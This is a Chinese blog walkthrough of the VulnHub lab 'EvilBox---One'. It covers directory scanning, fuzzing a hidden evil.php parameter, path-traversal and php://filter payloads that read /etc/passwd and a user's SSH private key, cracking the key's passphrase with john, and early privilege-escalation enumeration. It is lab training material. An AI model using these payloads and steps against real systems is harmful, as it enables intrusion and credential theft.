<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8"/>
    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
    <title>
      
        EvilBox---One | Blanks'Blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/apple-touch-icon.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/favicon-32x32.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/favicon-16x16.png"/>
    
    
      <link rel="mask-icon"
            href="/images/logo.svg"
            color=""/>
    
    
    
      
  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/regular.ttf);
        font-weight: regular;
    }
  </style>

  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/bold.ttf);
        font-weight: bold;
    }
  </style>


    
    <link rel="stylesheet"
          type="text/css"
          href='/css/layout.css'/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css" />
  

  <meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href='/' class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
            
          
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner--toc">
      <div class="post-content__head">
        <div class="post-title">EvilBox---One</div>
        <div class="post-info">
          
  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>


          <span class="post-date">2023-03-26</span>
        </div>
      </div>
      
        <aside class="toc-outer">
          <div class="toc-title">目录</div>
          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">主机发现</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">常规扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Gobuster</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">ffuf 模糊测试 测试参数</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">本地文件包含</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">php 伪协议</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">SSH 私钥登录</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">.ssh文件夹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">passphrase 密码破解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">john</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">生成passwd</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">成功提权</span></a></li></ol></li></ol>
          <a href="#" class="toc-top">回到顶部</a>
        </aside>
      
      <div class="post-content__body">
        
          <div class="post-gallery">
            
          </div>
        
        <meta name="referrer" content="no-referrer">



<p><a name="PY9Hz"></a></p>
<h1><span id="主机发现">主机发现</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679818743083-84264968-69a8-47e1-be51-073035bf99bb.png#averageHue=%23272c3a&clientId=ueb5e9fa1-c984-4&from=paste&height=172&id=ud1e0fde7&name=image.png&originHeight=172&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83877&status=done&style=none&taskId=ub8977f28-e053-43d6-9eb4-02d8ca274b3&title=&width=774" alt="image.png"><br>目标 主机 : 192.168.145.134 <br>attack 主机  ：192.168.145.130</p>
<p><a name="ZpEY8"></a></p>
<h1><span id="常规扫描">常规扫描</span></h1><blockquote>
<p>nmap -sV -O -p 1-65535 192.168.145.134</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679818853510-387b352b-beb4-4006-88b9-2e5e71219e22.png#averageHue=%23262a37&clientId=ueb5e9fa1-c984-4&from=paste&height=297&id=uac47e9ba&name=image.png&originHeight=297&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127577&status=done&style=none&taskId=udde17301-d218-462c-ab6b-925dd4a6855&title=&width=856" alt="image.png"><br>存在 22 端口 和 80 端口 <br>系统是  Debian  linux 4.15 - 5.6 版本 </p>
<p>访问 80 端口  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679818946490-5927defb-6e07-44c3-8196-1943880eaaa6.png#averageHue=%23d4ecee&clientId=ueb5e9fa1-c984-4&from=paste&height=641&id=ud7ad4dc6&name=image.png&originHeight=641&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162767&status=done&style=none&taskId=u0239a9f9-240e-43ee-98ff-eedbc755cc3&title=&width=988" alt="image.png"><br>没有部署什么环境，存apache2 环境 <br>目录扫描一下<br>发现了 四个目录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819364619-7f1cb2f3-81d2-4ddb-80da-d7c76bca22e2.png#averageHue=%23232734&clientId=ueb5e9fa1-c984-4&from=paste&height=84&id=u1a018975&name=image.png&originHeight=84&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22575&status=done&style=none&taskId=u5853a3c7-10f1-4138-968c-fb27c145d1c&title=&width=685" alt="image.png"><br>rebots.txt目录 看看 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819415861-b0683f2a-bb44-4744-8232-358c378a1229.png#averageHue=%23212129&clientId=ueb5e9fa1-c984-4&from=paste&height=295&id=u14f6a4e8&name=image.png&originHeight=295&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29347&status=done&style=none&taskId=u52da3bb7-23b1-44c1-886b-b4137c32874&title=&width=742" alt="image.png"><br>没有啥可用信息 ， <br>再查看secret目录下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819473911-d0a09f20-6221-4403-92a6-09695e359534.png#averageHue=%23c9aa8b&clientId=ueb5e9fa1-c984-4&from=paste&height=437&id=ufd5e4ea5&name=image.png&originHeight=437&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27525&status=done&style=none&taskId=u1fcd89c5-79ae-4a74-af59-81d87918540&title=&width=866" alt="image.png"><br>也不存在 可用信息 ，再次爆破一下 secret 目录下存在啥信息没 （换个字典 换个工具 ）<br><a name="YwBVn"></a></p>
<h2><span id="gobuster">Gobuster</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819806891-3a5e3b50-44aa-47eb-a0a9-45f564d43a8a.png#averageHue=%23f8f7f6&clientId=ueb5e9fa1-c984-4&from=paste&height=797&id=u7f067627&name=image.png&originHeight=797&originWidth=761&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60581&status=done&style=none&taskId=u52781bf3-c319-4ef8-b13d-f3c396fd2c3&title=&width=761" alt="image.png"><br>还是可以扫描dns 的一个工具 <br>现在针对 secret 这个目录 进行扫描探测 </p>
<blockquote>
<p>gobuster dir -u <a target="_blank" rel="noopener" href="http://192.168.145.134/secret/">http://192.168.145.134/secret/</a>  -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-1.0.txt -x txt,php,html,jsp</p>
</blockquote>
<p>扫描出前面没有 探测出的一个文件  evil.php 文件  （看着就不像好文件 ，和eval 长的像）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819864211-e8dab05f-894b-45b0-8c29-aebe92715409.png#averageHue=%23262933&clientId=ueb5e9fa1-c984-4&from=paste&height=382&id=u554309c8&name=image.png&originHeight=382&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143586&status=done&style=none&taskId=u82214160-1834-4428-bb07-ad8f6e7dc8e&title=&width=1069" alt="image.png"><br>访问一下 看看 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679819962935-5b9d999d-48f4-4820-b76b-c1b2dca28271.png#averageHue=%23fefefe&clientId=ueb5e9fa1-c984-4&from=paste&height=523&id=u519732c1&name=image.png&originHeight=523&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28710&status=done&style=none&taskId=u016c025b-9522-4252-a00f-fe7b2c6615f&title=&width=1108" alt="image.png"><br>这个文件还是空白 。。。 到目前为止没有发现其他文件了 <br>既然这个文件长的这么想后门 ，尝试爆破一下文件参数 </p>
<p><a name="RRZGH"></a></p>
<h1><span id="ffuf-模糊测试-测试参数">ffuf 模糊测试 测试参数</span></h1><p>使用burp 去测试先 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679820603096-af1b091b-f477-4fff-a09e-9475a0febf21.png#averageHue=%23fcfcfc&clientId=ueb5e9fa1-c984-4&from=paste&height=378&id=ua81459bd&name=image.png&originHeight=378&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30771&status=done&style=none&taskId=ud3867a14-4156-441f-8762-19c11367bf7&title=&width=1283" alt="image.png"><br>添加两个payload 参数和路径 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679820624379-1f9a2fd6-4134-4781-bed5-c8faed4225f1.png#averageHue=%23f7f5f5&clientId=ueb5e9fa1-c984-4&from=paste&height=437&id=uce974e52&name=image.png&originHeight=437&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25213&status=done&style=none&taskId=u621b223f-557c-4cdb-a806-6b6bb852639&title=&width=580" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679820640465-f8b75604-7df8-4106-bd70-a1b66c4be009.png#averageHue=%23f7f6f5&clientId=ueb5e9fa1-c984-4&from=paste&height=401&id=u376366d2&name=image.png&originHeight=401&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23471&status=done&style=none&taskId=ua2b0296c-f8c1-4871-9207-149b103f94d&title=&width=620" alt="image.png"></p>
<p>经过一段时间的爆破 <br>终于爆破出来了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679820972100-66e17b3d-a362-4e51-a116-5459564b0b16.png#averageHue=%23f8f4f1&clientId=ueb5e9fa1-c984-4&from=paste&height=676&id=uca67bab8&name=image.png&originHeight=676&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76262&status=done&style=none&taskId=u4738c2ef-8f6b-4363-9240-5c2725be4ef&title=&width=891" alt="image.png"><br>期间还使用了 ffuf 工具 但是没有爆破出来 可能是字典的原因吧<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821013267-1e74cefe-ca87-4899-af58-0e3a59b4d70e.png#averageHue=%232f323c&clientId=ueb5e9fa1-c984-4&from=paste&height=477&id=u4f2f0faf&name=image.png&originHeight=477&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61093&status=done&style=none&taskId=udf5b3e32-5cce-4e07-927f-6602fd760b0&title=&width=958" alt="image.png"></p>
<p><a name="IMupw"></a></p>
<h1><span id="本地文件包含">本地文件包含</span></h1><p>现在去查看  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret/evil.php?<span class="hljs-built_in">command</span>=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd HTTP/1.1<br>Host: 192.168.145.134<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br></code></pre></td></tr></table></figure>
<blockquote>
<p>&#x2F;secret&#x2F;evil.php?command&#x3D;%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd</p>
</blockquote>
<p>可以看出来是文件包含漏洞了<br>不使用url编码就可以是这样了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821162975-1e5661bf-9bc5-4206-bb29-81c38e4045b5.png#averageHue=%23dcbd90&clientId=ueb5e9fa1-c984-4&from=paste&height=402&id=uf3789d0b&name=image.png&originHeight=402&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184008&status=done&style=none&taskId=u9e674c89-d8fa-4949-b499-2301559bb5c&title=&width=1000" alt="image.png"><br>看看是否存在远程文件包含 <br>先写一句话 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821319114-ea1badc5-eca1-4b6e-9e20-42946f91ccb3.png#averageHue=%2330343e&clientId=ueb5e9fa1-c984-4&from=paste&height=93&id=u4cf19b45&name=image.png&originHeight=93&originWidth=515&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13159&status=done&style=none&taskId=u31fbbcb0-a7ef-430c-a936-376564e9ee2&title=&width=515" alt="image.png"><br>本地启动 apache2 服务 </p>
<blockquote>
<p>systemctl restart apache2 </p>
</blockquote>
<p>测试一句话 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821401755-086ec941-534f-4b25-909d-989d37acd06b.png#averageHue=%23e9dfc8&clientId=ueb5e9fa1-c984-4&from=paste&height=224&id=u78df021e&name=image.png&originHeight=224&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24088&status=done&style=none&taskId=ued42195e-425d-4cbf-8e9f-4c4ab2ecac8&title=&width=770" alt="image.png"><br>去测试 靶机是否存在远程文件包含 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821482829-9c4008be-deb0-4b29-9dcd-f06b13b0c8d6.png#averageHue=%23fefefe&clientId=ueb5e9fa1-c984-4&from=paste&height=520&id=u23a035cc&name=image.png&originHeight=520&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26870&status=done&style=none&taskId=ub8b730d5-1b13-4960-b1d9-bfe2eb37959&title=&width=1184" alt="image.png"><br>不会显 ，看来是不存在远程文件包含了 </p>
<p><a name="qDdpn"></a></p>
<h2><span id="php-伪协议">php 伪协议</span></h2><blockquote>
<p>?command&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;evil.php</p>
</blockquote>
<p>使用php:&#x2F;&#x2F;filter 读取文件 <br>这里先读取 evil.php 文件 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821645916-3e7dd85a-3ea4-461e-b7b2-3162eb498ea0.png#averageHue=%23c7a785&clientId=ueb5e9fa1-c984-4&from=paste&height=401&id=u4d5b1120&name=image.png&originHeight=401&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41826&status=done&style=none&taskId=u9a49613b-302e-4f6e-9a7f-80476824111&title=&width=1116" alt="image.png"><br>给base64 解码 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679821695255-80fc2ab8-2853-44c6-80c2-7ab731a49a70.png#averageHue=%232c2f39&clientId=ueb5e9fa1-c984-4&from=paste&height=173&id=u4faef72f&name=image.png&originHeight=173&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26547&status=done&style=none&taskId=uc456004b-56a7-4a44-a602-34804050a53&title=&width=940" alt="image.png"><br>看来是直接把传入的值 ， 去包含 读取了 <br>尝试是否可以写入文件 ，</p>
<blockquote>
<p>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php&amp;txt&#x3D;MTIzNDUK</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679822731679-57fb85c1-f47c-483d-b543-1e0524d27fb5.png#averageHue=%23d0baaa&clientId=ueb5e9fa1-c984-4&from=paste&height=432&id=u713a9f3d&name=image.png&originHeight=432&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33616&status=done&style=none&taskId=ua5b40407-24b2-4eb8-9e8f-68f3519df9f&title=&width=1271" alt="image.png"><br>不知道是否成功 ，去读取一下 ，写入进去一般是存在于当前目录下或者根目录下</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679822804521-7a58f164-a5bd-4257-b10c-50bbc829b562.png#averageHue=%23d9bd99&clientId=ueb5e9fa1-c984-4&from=paste&height=328&id=ue599d24a&name=image.png&originHeight=328&originWidth=837&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40755&status=done&style=none&taskId=u66e2a38f-5673-424b-8a8f-255d490d5d5&title=&width=837" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679822821643-d524eea0-f1d2-4fe4-824c-fbb1c0070548.png#averageHue=%23d1b28e&clientId=ueb5e9fa1-c984-4&from=paste&height=290&id=u4374bdd0&name=image.png&originHeight=290&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38259&status=done&style=none&taskId=u3d5a054a-463d-4a09-9505-a10314a56c6&title=&width=806" alt="image.png"><br>都是不存在的，看来是没有写入权限了  <br>思路有没了 ，<br><a name="rNldP"></a></p>
<h1><span id="ssh-私钥登录">SSH 私钥登录</span></h1><p>开放了22 端口 <br>存在ssh 登录的<br> 文件包含一下  &#x2F;etc&#x2F;passwd <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823197408-df893122-4753-427f-9375-f9c451fe1b85.png#averageHue=%23f4eee8&clientId=ueb5e9fa1-c984-4&from=paste&height=306&id=u406475bf&name=image.png&originHeight=306&originWidth=986&originalType=binary&ratio=1&rotation=0&showTitle=false&size=163580&status=done&style=none&taskId=ub72b18b4-b7f8-4736-9d01-e5c09cc8898&title=&width=986" alt="image.png"><br>存在 mowree 普通用户 <br>查看一下这个目录下包含ssh的文件吗？<br><a name="WaCmD"></a></p>
<h2><span id="ssh文件夹">.ssh文件夹</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823266437-a4733324-e31f-412f-979b-a201fc20ae58.png#averageHue=%23e2c995&clientId=ueb5e9fa1-c984-4&from=paste&height=758&id=ua22078b9&name=image.png&originHeight=758&originWidth=993&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90946&status=done&style=none&taskId=uf2ce9321-01d5-47e6-bdc2-ab78a6d4585&title=&width=993" alt="image.png"><br>是包含ssh 的 公钥私钥 授权文件的地方</p>
<blockquote>
<p>command&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;authorized_keys</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823369972-c80ecdf7-c669-40de-8506-388ff2a456e5.png#averageHue=%23eee5c7&clientId=ueb5e9fa1-c984-4&from=paste&height=312&id=u3616d99b&name=image.png&originHeight=312&originWidth=1416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93281&status=done&style=none&taskId=u58fa194d-e218-4b79-9d1a-a5aac9505e6&title=&width=1416" alt="image.png"><br>可以看出授权了mowree用户登录 <br>再查看id_rsa   和  id_rsa.pub <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823495458-0a8f94d3-5aa4-4693-a260-8964a8310700.png#averageHue=%23e0c496&clientId=ueb5e9fa1-c984-4&from=paste&height=375&id=uee76fee8&name=image.png&originHeight=375&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=329729&status=done&style=none&taskId=uecb06ed3-50f3-4abe-9901-9af7e2c1460&title=&width=1401" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823537551-83e93fbf-ee49-46e2-b9f5-908825407c78.png#averageHue=%23e4e4e2&clientId=ueb5e9fa1-c984-4&from=paste&height=222&id=u0229ad66&name=image.png&originHeight=222&originWidth=1078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22935&status=done&style=none&taskId=uddfb0469-fc61-4bb2-a26a-1a3a1da8cf0&title=&width=1078" alt="image.png"><br>公钥查看不了 ，<br>但是有私钥就够了 ，有私钥就可以完成登录了 <br>在本地创建一个id_rsa  的文件  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679823976014-998a2b8b-f6cc-4ee4-a40e-b73451fee5cb.png#averageHue=%23282d3b&clientId=ueb5e9fa1-c984-4&from=paste&height=616&id=ue8255980&name=image.png&originHeight=616&originWidth=688&originalType=binary&ratio=1&rotation=0&showTitle=false&size=356569&status=done&style=none&taskId=u2e1622cb-f58d-4f3c-a627-d13f5536961&title=&width=688" alt="image.png"><br>文件内容是刚才获取到的 id_rsa <br>利用私钥 连接ssh  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679824209732-f80dc139-f48b-43a4-abff-91bdddf89c6c.png#averageHue=%23252834&clientId=ueb5e9fa1-c984-4&from=paste&height=119&id=ud38dc2bf&name=image.png&originHeight=119&originWidth=631&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29598&status=done&style=none&taskId=u7bf379cd-f9f3-4184-986b-23b15989990&title=&width=631" alt="image.png"><br>额 这 <br>需要 passphrase 的密码文 ，<br>作者在生成私钥的时候 又给私钥加了一个密码<br><a name="dmq9F"></a></p>
<h2><span id="passphrase-密码破解">passphrase 密码破解</span></h2><p>使用暴力破解就需要一个大一点的字典 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679824526384-e670deff-aaab-445d-92c8-0c7cfc3e371c.png#averageHue=%23252a38&clientId=ueb5e9fa1-c984-4&from=paste&height=290&id=u5c12370b&name=image.png&originHeight=290&originWidth=839&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134289&status=done&style=none&taskId=u687bbf7a-1123-4f9f-a885-3ddcdd35394&title=&width=839" alt="image.png"><br> 使用这个字典去破解<br>可以使用 hashcat  或者 john工具进行破解<br><a name="m9Axo"></a></p>
<h3><span id="john">john</span></h3><p>使用这个工具 ，因为需要把id_rsa 转换暴力破解的格式<br>这个 john 刚好有对应的转换脚本<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679824879142-c6c526fc-ad2b-44ca-b3dd-ebdd4b9d5f3d.png#averageHue=%23292f3d&clientId=ueb5e9fa1-c984-4&from=paste&height=559&id=u7a880b11&name=image.png&originHeight=559&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&size=392570&status=done&style=none&taskId=u464545f4-31cf-4ac6-9f98-65b71112156&title=&width=929" alt="image.png"><br>转换好了 使用 John 开始爆破</p>
<blockquote>
<p> john  hash –wordlist&#x3D;rockyou.txt</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679824982110-413f0408-34ac-4589-903f-fff434fd65f0.png#averageHue=%23252935&clientId=ueb5e9fa1-c984-4&from=paste&height=244&id=u0acc5433&name=image.png&originHeight=244&originWidth=841&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112565&status=done&style=none&taskId=u4eeccc9e-0a0b-4917-b040-ea2b7af7ef1&title=&width=841" alt="image.png"><br>爆破出来了还是很快的<br>进行登录 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825028367-86ba1098-7163-4a9d-a3a8-7a28f43991ba.png#averageHue=%23242733&clientId=ueb5e9fa1-c984-4&from=paste&height=116&id=u622c5334&name=image.png&originHeight=116&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33461&status=done&style=none&taskId=uf9404619-7db9-40eb-9905-e883394e010&title=&width=786" alt="image.png"><br>成功登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825064196-bb35642d-b682-46d8-a6d4-0491292ef084.png#averageHue=%23252935&clientId=ueb5e9fa1-c984-4&from=drop&id=ub12c4949&name=7627c0cb-166e-4972-8ff3-688eecc376cf.png&originHeight=64&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19746&status=done&style=none&taskId=uf6192075-a283-4caa-b311-f6fe1a66dea&title=" alt="7627c0cb-166e-4972-8ff3-688eecc376cf.png"></p>
<p><a name="xPb0g"></a></p>
<h1><span id="提权">提权</span></h1><blockquote>
<p>crontab -l          计划任务</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825113823-12e0abe7-36ef-457a-8405-4525122d81b6.png#averageHue=%23353b46&clientId=ueb5e9fa1-c984-4&from=paste&height=49&id=u6eed38f8&name=image.png&originHeight=49&originWidth=394&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12357&status=done&style=none&taskId=uc852fbef-3128-4729-81a2-078245e0ced&title=&width=394" alt="image.png"></p>
<blockquote>
<p>sudo -l</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825140932-919cdf15-590d-48ae-8781-f2dd9c5f455f.png#averageHue=%23252a36&clientId=ueb5e9fa1-c984-4&from=paste&height=61&id=ub4f83508&name=image.png&originHeight=61&originWidth=438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11558&status=done&style=none&taskId=u882b360e-f05c-449d-a619-feea3aea411&title=&width=438" alt="image.png"><br>这两个常用的方法都是没有的<br>还有查看内核版本了 </p>
<blockquote>
<p>uname -a </p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825190092-51f74000-8218-40d3-8334-cf2ed70d77af.png#averageHue=%23222532&clientId=ueb5e9fa1-c984-4&from=paste&height=90&id=u5750e607&name=image.png&originHeight=90&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26031&status=done&style=none&taskId=uf44904c1-f268-4daa-8b00-c26c25bffb4&title=&width=853" alt="image.png"><br>版本是 4.19.0-17-amd64</p>
<blockquote>
<p>searchsploit 4.19      </p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825268759-5b710f30-43c4-4e7a-b361-88aeacb54955.png#averageHue=%23292d3a&clientId=ueb5e9fa1-c984-4&from=paste&height=299&id=u12d1e26d&name=image.png&originHeight=299&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148965&status=done&style=none&taskId=uc17f509d-5e3b-41d8-ac8e-8271ae647d9&title=&width=821" alt="image.png"><br>尝试一下 ，符合版本但是不知道是否成功提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825700107-337b186d-b85a-4004-a84b-07184257c01e.png#averageHue=%23292c37&clientId=ueb5e9fa1-c984-4&from=paste&height=258&id=u2727b3cc&name=image.png&originHeight=258&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121190&status=done&style=none&taskId=u102b18d7-d84d-4d9f-bec5-a7f09a3d5be&title=&width=903" alt="image.png"><br>下载到目标机<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679825878368-197f55d7-1a23-4d84-87c3-d07f64546b39.png#averageHue=%23262b36&clientId=ueb5e9fa1-c984-4&from=paste&height=91&id=u35270f60&name=image.png&originHeight=91&originWidth=463&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24548&status=done&style=none&taskId=u4eecf7f1-5716-47ed-8126-56a6234de63&title=&width=463" alt="image.png"><br>好像没有用 ，<br>那就再次查找是否存在可写入的文件 </p>
<blockquote>
<p>find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null </p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826066829-7eeca5ad-6c25-4d13-bc94-ab3f756c1639.png#averageHue=%232b2f3a&clientId=ueb5e9fa1-c984-4&from=paste&height=388&id=u4466ee9d&name=image.png&originHeight=388&originWidth=932&originalType=binary&ratio=1&rotation=0&showTitle=false&size=230823&status=done&style=none&taskId=udf00119d-5a5d-48b0-a222-a2490309c8d&title=&width=932" alt="image.png"><br>文件太多了  ，很多系统文件 <br>像 sys &#x2F;proc 这些就没有必要看了</p>
<blockquote>
<p>find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null  | grep -v sys | grep -v proc</p>
</blockquote>
